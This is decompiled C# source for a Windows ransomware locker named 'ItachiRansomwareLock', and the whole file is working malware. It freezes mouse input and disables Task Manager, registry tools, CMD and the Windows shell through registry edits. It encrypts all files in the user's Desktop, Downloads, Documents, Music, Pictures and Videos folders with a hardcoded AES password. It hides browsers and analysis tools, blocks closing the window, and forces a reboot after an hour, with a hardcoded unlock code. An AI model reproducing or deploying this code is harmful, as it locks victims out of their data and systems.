using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ItachiRansomwareLock;

public class Form1 : Form
{
	public class CoreEncryption
	{
		public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class EncryptionFile
	{
		public void EncryptFile(string file, string password)
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private IContainer components = null;

	private Label label1;

	private Label label3;

	private Label label2;

	private Button button1;

	private TextBox codebox;

	private PictureBox pictureBox2;

	private PictureBox pictureBox1;

	private Timer tmr_show;

	private Timer tmr_if;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private Timer tmr_hide;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public Form1()
	{
		InitializeComponent();
		((Control)label2).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)codebox).get_Text() == "")
		{
			MessageBox.Show("Please Enter Text", "Wrong", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (((Control)codebox).get_Text() == "UnlockRansomware35252112222")
		{
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey2.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
			RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey3.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey4.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
			RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
			registryKey5.SetValue("NoChangingWallPaper", 0, RegistryValueKind.DWord);
			RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			registryKey6.SetValue("DisableCMD", 0, RegistryValueKind.DWord);
			OFF_Encrypt();
		}
		else
		{
			MessageBox.Show("Please Enter Corrent Password", "Wrong", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey3.SetValue("Shell", "empty", RegistryValueKind.String);
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey4.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
		RegistryKey registryKey5 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop");
		registryKey5.SetValue("NoChangingWallPaper", 1, RegistryValueKind.DWord);
		RegistryKey registryKey6 = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		registryKey6.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label2).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_show.Start();
		tmr_if.Start();
		tmr_encrypt.Start();
		tmr_clock.Start();
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	public static void Thawouse()
	{
		BlockInput(block: false);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private static void Start_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(folderPath2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(folderPath3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(folderPath4 + "\\", "*", SearchOption.AllDirectories);
		string[] files6 = Directory.GetFiles(folderPath5 + "\\", "*", SearchOption.AllDirectories);
		EncryptionFile encryptionFile = new EncryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			encryptionFile.EncryptFile(files[i], password);
		}
		for (int i = 0; i < files2.Length; i++)
		{
			encryptionFile.EncryptFile(files2[i], password);
		}
		for (int i = 0; i < files3.Length; i++)
		{
			encryptionFile.EncryptFile(files3[i], password);
		}
		for (int i = 0; i < files4.Length; i++)
		{
			encryptionFile.EncryptFile(files4[i], password);
		}
		for (int i = 0; i < files5.Length; i++)
		{
			encryptionFile.EncryptFile(files5[i], password);
		}
		for (int i = 0; i < files6.Length; i++)
		{
			encryptionFile.EncryptFile(files6[i], password);
		}
	}

	private static void OFF_Encrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(folderPath2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(folderPath3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(folderPath4 + "\\", "*", SearchOption.AllDirectories);
		string[] files6 = Directory.GetFiles(folderPath5 + "\\", "*", SearchOption.AllDirectories);
		DecryptionFile decryptionFile = new DecryptionFile();
		string password = "password123";
		for (int i = 0; i < files.Length; i++)
		{
			decryptionFile.DecryptFile(files[i], password);
		}
		for (int i = 0; i < files2.Length; i++)
		{
			decryptionFile.DecryptFile(files2[i], password);
		}
		for (int i = 0; i < files3.Length; i++)
		{
			decryptionFile.DecryptFile(files3[i], password);
		}
		for (int i = 0; i < files4.Length; i++)
		{
			decryptionFile.DecryptFile(files4[i], password);
		}
		for (int i = 0; i < files5.Length; i++)
		{
			decryptionFile.DecryptFile(files5[i], password);
		}
		for (int i = 0; i < files6.Length; i++)
		{
			decryptionFile.DecryptFile(files6[i], password);
		}
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		tmr_show.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "ProcessHacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "chrome")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "browser")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "iexplore")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sethc")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "powershell")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Discord")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "mmc")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "WinRAR")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "7zFM")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "msedge")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Taskmgr")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "perfmon")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "firefox")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "HxD")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "taskmgr")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "TM")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Maxthon")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "opera")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "UCBrowser")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Brave")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "brave")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
	}

	private void tmr_encrypt_Tick(object sender, EventArgs e)
	{
		tmr_encrypt.Stop();
		Start_Encrypt();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		tmr_clock.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		tmr_hide.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(752, 405));
		((Form)this).set_Location(new Point(500, 500));
		Thawouse();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_026b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0275: Expected O, but got Unknown
		//IL_0313: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Expected O, but got Unknown
		//IL_03d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03df: Expected O, but got Unknown
		//IL_0476: Unknown result type (might be due to invalid IL or missing references)
		//IL_0480: Expected O, but got Unknown
		//IL_0504: Unknown result type (might be due to invalid IL or missing references)
		//IL_050e: Expected O, but got Unknown
		//IL_0733: Unknown result type (might be due to invalid IL or missing references)
		//IL_073d: Expected O, but got Unknown
		//IL_077e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0788: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label3 = new Label();
		label2 = new Label();
		button1 = new Button();
		codebox = new TextBox();
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		tmr_show = new Timer(components);
		tmr_if = new Timer(components);
		tmr_encrypt = new Timer(components);
		tmr_clock = new Timer(components);
		tmr_hide = new Timer(components);
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Cursor(Cursors.get_Help());
		((Control)label1).set_Font(new Font("Tempus Sans ITC", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(7, 7));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(752, 405));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text(componentResourceManager.GetString("label1.Text"));
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Cursor(Cursors.get_No());
		((Control)label3).set_Font(new Font("Arial", 24f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(179, 510));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(260, 37));
		((Control)label3).set_TabIndex(14);
		((Control)label3).set_Text("REAMING TIME:");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Cursor(Cursors.get_No());
		((Control)label2).set_Font(new Font("Arial Black", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_ForeColor(Color.White);
		((Control)label2).set_Location(new Point(466, 517));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(111, 30));
		((Control)label2).set_TabIndex(13);
		((Control)label2).set_Text("00:00:00");
		((Control)button1).set_Cursor(Cursors.get_Hand());
		((ButtonBase)button1).set_FlatStyle((FlatStyle)1);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_ForeColor(Color.White);
		((Control)button1).set_Location(new Point(179, 454));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(398, 53));
		((Control)button1).set_TabIndex(12);
		((Control)button1).set_Text("DECRYPT FILES");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)codebox).set_BackColor(Color.RoyalBlue);
		((Control)codebox).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)codebox).set_ForeColor(Color.White);
		((Control)codebox).set_Location(new Point(179, 417));
		((Control)codebox).set_Name("codebox");
		((Control)codebox).set_Size(new Size(398, 31));
		((Control)codebox).set_TabIndex(11);
		codebox.set_TextAlign((HorizontalAlignment)2);
		codebox.set_UseSystemPasswordChar(true);
		((Control)pictureBox2).set_Cursor(Cursors.get_No());
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(583, 454));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(125, 105));
		pictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox2.set_TabIndex(10);
		pictureBox2.set_TabStop(false);
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(48, 454));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(125, 105));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(9);
		pictureBox1.set_TabStop(false);
		tmr_show.set_Enabled(true);
		tmr_show.set_Interval(1000);
		tmr_show.add_Tick((EventHandler)tmr_show_Tick);
		tmr_if.set_Enabled(true);
		tmr_if.set_Interval(300);
		tmr_if.add_Tick((EventHandler)tmr_if_Tick);
		tmr_encrypt.set_Enabled(true);
		tmr_encrypt.set_Interval(1000);
		tmr_encrypt.add_Tick((EventHandler)tmr_encrypt_Tick);
		tmr_clock.set_Enabled(true);
		tmr_clock.set_Interval(3600000);
		tmr_clock.add_Tick((EventHandler)tmr_clock_Tick);
		tmr_hide.set_Enabled(true);
		tmr_hide.set_Interval(10000);
		tmr_hide.add_Tick((EventHandler)tmr_hide_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.RoyalBlue);
		((Form)this).set_ClientSize(new Size(765, 579));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)codebox);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("ItachiRansomwareLock");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
